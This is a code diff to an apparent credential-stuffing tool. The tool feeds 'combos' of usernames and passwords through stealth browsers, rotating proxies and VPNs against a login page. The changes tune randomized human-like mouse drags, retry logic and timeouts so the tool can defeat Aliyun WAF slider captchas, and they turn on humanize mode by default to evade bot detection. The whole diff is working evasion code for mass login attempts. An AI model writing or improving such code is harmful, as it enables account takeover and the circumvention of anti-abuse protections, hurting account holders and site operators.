@@ -2028,6 +2028,20 @@ async def _touch(cdp, etype, x, y, keep=False):
 
 async def _human_drag(page, ctx, sx, sy, dist):
     try:
+        if not (_PLAT['is_android'] or _PLAT['is_termux_native']):
+            # ponytail: CloakBrowser humanize=True requires 1-2 mouse waypoints (many micro-steps or CDP touch trigger F001)
+            R = lambda a, b: a + random.random() * (b - a)
+            await page.mouse.move(sx + R(-2.0, 2.0), sy + R(-2.0, 2.0))
+            await asyncio.sleep(R(0.06, 0.12))
+            await page.mouse.down()
+            await asyncio.sleep(R(0.06, 0.12))
+            mid_frac = R(0.40, 0.65)
+            await page.mouse.move(sx + dist * mid_frac, sy + R(-1.5, 1.5))
+            await asyncio.sleep(R(0.04, 0.08))
+            await page.mouse.move(sx + dist, sy + R(-0.8, 0.8))
+            await asyncio.sleep(R(0.06, 0.11))
+            await page.mouse.up()
+            return True
         # ponytail: reuse single CDP session per page so 1000+ slider solves don't leak zombie CDP sessions
         cdp = getattr(page, '_touch_cdp', None)
         if cdp is None:
@@ -2160,6 +2174,11 @@ async def _solve_waf_impl(page, ctx) -> bool:
     for mult in (1.0, 0.96):
         if mult != 1.0:
             try:
+                await page.evaluate("""() => {
+                    const rf = document.querySelector('#aliyunCaptcha-sliding-body, .aliyunCaptcha-refresh, .nc_iconfont');
+                    if (rf && (document.body.innerText || '').includes('Verification failed')) rf.click();
+                }""")
+                await asyncio.sleep(0.4)
                 box = await page.evaluate(_SLIDER_BOX_JS) or box
             except Exception:
                 pass
@@ -2169,10 +2188,16 @@ async def _solve_waf_impl(page, ctx) -> bool:
         if not await _human_drag(page, ctx, sx, sy, variant_dist):
             continue
         still = True
-        for _ in range(10):
+        for _ in range(35):
             await asyncio.sleep(0.1)
             try:
                 still = await page.evaluate(_SLIDER_VISIBLE_JS)
+                if still:
+                    failed_now = await page.evaluate(
+                        "() => ((document.getElementById('WAF_NC_WRAPPER') || document.getElementById('aliyunCaptcha-sliding-body') || document.body).innerText || '').includes('Verification failed')"
+                    )
+                    if failed_now:
+                        break
             except Exception as ex:
                 if 'execution context was destroyed' in str(ex).lower():
                     await asyncio.sleep(0.3)
@@ -3240,7 +3265,7 @@ class VpnCoordinator:
             return True
 
 # ── Smart Browser Launcher (CloakBrowser Keyless / Termux / System Chromium) ─
-async def launch_browser_smart(headless=True, humanize=False):
+async def launch_browser_smart(headless=True, humanize=True):
     global _driver_pid, _pw_instance, _USING_STEALTH_PATCH
     is_root = (os.name != 'nt' and hasattr(os, 'geteuid') and os.geteuid() == 0)
     _bg_kill_args = [
@@ -3426,7 +3451,7 @@ async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[
 # ── Core Browser Login via Manual Form Typing ────────────────────────────────
 async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, waf_lock: asyncio.Lock | None = None) -> tuple[str, dict]:
     """Submit form dan tangkap respons login menggunakan Direct Vue Bridge + Fallback Natural Typing."""
-    api_result = {"json": None, "raw": None, "had_waf": False, "proxy_err": False, "proxy_407": False}
+    api_result = {"json": None, "raw": None, "had_waf": False, "waf_html": False, "proxy_err": False, "proxy_407": False}
     resp_event = asyncio.Event()
     req_sent = asyncio.Event()
 
@@ -3496,6 +3521,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 if not body_stripped.startswith('{'):
                     if any(k in body_low for k in ('aliyun', 'waf', 'captcha', '<html')):
                         api_result["had_waf"] = True
+                        api_result["waf_html"] = True
                         resp_event.set()
                     elif resp.status >= 400:
                         api_result["proxy_err"] = True
@@ -3669,7 +3695,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                     try:
                         await page.wait_for_selector(
                             '#aliyunCaptcha-sliding-slider, .btn_slide, [id*="sliding-slider"]',
-                            state='visible', timeout=2200
+                            state='visible', timeout=(6500 if api_result["waf_html"] else 2200)
                         )
                     except Exception:
                         pass
@@ -4458,7 +4484,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         b = await ensure_browser(force_relaunch=True, stale_browser=b)
                 cur_browser = b
 
-                ctx_opts = {'has_touch': True}
+                ctx_opts = {'has_touch': bool(_PLAT['is_android'] or _PLAT['is_termux_native'])}
                 if cur_proxy_info and cur_proxy_info.get('username'):
                     rot_user_info = await rotated_user_async(
                         cur_proxy_info['username'],
@@ -6198,7 +6224,7 @@ async def async_main():
                 _driver_pid = None
                 if force_relaunch:
                     await asyncio.sleep(2.0)
-                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
+                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)
                 browser_state['last_relaunch'] = time.monotonic()
             return browser_ref[0]
 
@@ -6218,7 +6244,7 @@ async def async_main():
             if not await vpn_coord.start_initial_ovpn(stats):
                 return
         _load_static_cache()
-        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
+        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)
         browser_state['last_relaunch'] = time.monotonic()
 
         spawn_w = min(NUM_CONTEXTS, max(1, len(queue)))
